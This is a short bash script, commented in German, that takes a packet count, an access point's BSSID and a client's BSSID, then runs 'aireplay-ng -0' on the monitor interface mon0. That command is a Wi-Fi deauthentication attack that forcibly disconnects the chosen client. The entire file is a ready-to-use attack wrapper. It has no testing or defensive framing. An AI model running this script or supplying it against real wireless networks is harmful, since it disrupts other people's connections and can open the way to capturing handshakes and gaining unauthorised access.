#!/bin/bash

if [ $# -ne 3 ]; then
	exit 1
	
	else #anzahl Beacons, accessPoint-bssid, dann client-bssid
		if aireplay-ng -0 $1 -a $2 -c $3 mon0; then
			exit 0
		else
			exit 1
		fi
fi

		
